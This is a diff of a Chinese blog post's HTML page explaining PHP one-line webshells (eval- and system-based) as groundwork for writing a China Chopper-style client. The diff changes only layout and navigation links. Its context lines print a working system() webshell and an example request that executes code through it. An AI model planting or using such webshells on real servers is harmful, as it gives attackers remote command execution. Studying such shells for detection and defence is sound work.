@@ -25,7 +25,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg">
 <meta property="og:image" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut2.jpg">
-<meta property="og:updated_time" content="2018-07-18T03:01:46.246Z">
+<meta property="og:updated_time" content="2018-07-18T06:16:29.959Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="自写菜刀之路——PHP一句话木马的实现原理与利用方法">
 <meta name="twitter:description" content="最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&amp;lt;?php @eval($_GET[&quot;">
@@ -208,13 +208,15 @@
 <p>那么用eval和system有什么区别呢？在这里大概说一说，应为对这类脚本语言都不熟悉，就只能说说自己了解的。</p>
 <p>eval()是把其中的参数按照PHP代码来解析，因此eval()函数后跟的都必须是合法的PHP代码，切必须以分号结尾。</p>
 <p>使用eval()函数的一句话实现菜刀的功能：</p>
-<p><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg" alt=""></p>
+<center><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg" alt=""></center>
+
 <p>code参数后边直接跟PHP代码就可以执行了，记得以分号结尾。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell1.php?code=phpinfo();</span><br></pre></td></tr></table></figure>
 <p>再说system()函数，PHP中system()函数的参数是直接跟具体命令而不是PHP代码。举个例子：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @system($_GET[<span class="string">"code"</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>对于这样的一句话，通过GET方法提交参数后的效果如下图：</p>
-<p><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut2.jpg" alt=""></p>
+<center><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut2.jpg" alt=""></center>
+
 <p>可以看到，code参数直接赋值具体命令就可以完成命令执行了。总结一下就是eval()函数是代码执行，system()函数是命令执行。</p>
 <p>当然现在直接使用这两个函数的一句话基本看不到了，毕竟特征太明显了，大部分情况下都会被拦截。但高深的一句话用法以后再讨论了，当下还是要先写菜刀。。。。</p>
 <p><a href="http://www.cnblogs.com/KevinGeorge/p/8127054.html" target="_blank" rel="noopener">参考文章链接</a></p>
@@ -248,10 +250,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2018/07/05/易语言实现天刀兑换活动Q币/">
+    <a class="show pull-left" href="/2018/07/18/PhpMyadmin命令执行漏洞（CVE-2016-5734）/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2018/07/18/PhpMyadmin命令执行漏洞（CVE-2016-5734）/">
+    <a class="show pull-right" href="/2018/08/03/Python实现爬行漏洞影响范围/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
